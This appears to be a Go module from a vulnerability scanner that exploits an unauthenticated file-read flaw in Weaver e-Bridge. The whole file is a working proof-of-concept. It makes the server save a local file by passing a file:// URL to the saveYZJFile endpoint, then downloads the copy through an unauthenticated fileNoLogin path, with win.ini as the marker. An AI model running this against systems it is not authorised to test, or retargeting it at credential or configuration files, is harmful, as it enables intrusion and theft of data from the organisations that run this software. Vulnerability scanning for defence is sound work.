package ecology_saveYZJFile

import (
	"encoding/json"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

type JsonResponse struct {
	ID string `json:"id"`
}

func Run(url string) {
	// 第一个请求：尝试通过漏洞读取文件
	firstReqUrl := url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt"
	resp1, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(firstReqUrl)

	if err != nil {
		color.Red.Println("[-14] 泛微e-Bridge未授权文件读取漏洞windows不存在")
		return
	}

	// 解析响应以获取文件的 endpoint
	var jsonResponse JsonResponse
	err = json.Unmarshal(resp1.Bytes(), &jsonResponse)
	if err != nil {
		color.Red.Println("[-14] 泛微e-Bridge未授权文件读取漏洞windows不存在")
		return
	}

	// 第二个请求：使用从第一个响应中获取的 endpoint 访问文件
	secondReqUrl := url + "/file/fileNoLogin/" + jsonResponse.ID
	resp2, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(secondReqUrl)

	if err != nil {
		color.Red.Println("[-14] 泛微e-Bridge未授权文件读取漏洞windows不存在")
		return
	}

	// 检查第二个响应是否包含特定的文本
	body2 := resp2.String()
	if strings.Contains(body2, "bit app support") && resp2.StatusCode == 200 {
		color.Green.Println("[+14] 泛微e-Bridge未授权文件读取漏洞windows存在 -> ", secondReqUrl)
	} else {
		color.Red.Println("[-14] 泛微e-Bridge未授权文件读取漏洞windows不存在")
	}
}
